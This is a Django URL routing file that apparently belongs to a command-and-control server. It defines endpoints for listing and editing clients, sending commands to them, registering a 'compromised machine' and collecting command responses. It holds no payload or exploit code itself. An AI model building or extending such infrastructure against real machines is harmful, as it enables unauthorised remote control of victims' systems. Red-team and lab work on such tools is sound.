from django.urls import path
from .views import (ClientListView, ClientEdit, CommandAPI,
                    ClientCommand,CompromisedMachine, CommandResponse,
                    CommandResponseByCommand)

urlpatterns = [
    path('clients/', ClientListView.as_view(), name='client-list'),
    path('clients/<str:id>/', ClientEdit.as_view(), name='client-update'),
    path('commands/', CommandAPI.as_view(), name='command'),
    path('client-commands/<str:client_id>/', ClientCommand.as_view(), name='client-commands'),
    path("command-response/<str:id>", CommandResponse.as_view(), name="command-response"),
    path('compromised-machine/', CompromisedMachine.as_view(), name='compromised-machine'),
    path("command-response-by-command/<int:client_id>/<str:command>/", CommandResponseByCommand.as_view(), name="command-response-by-command"),
]
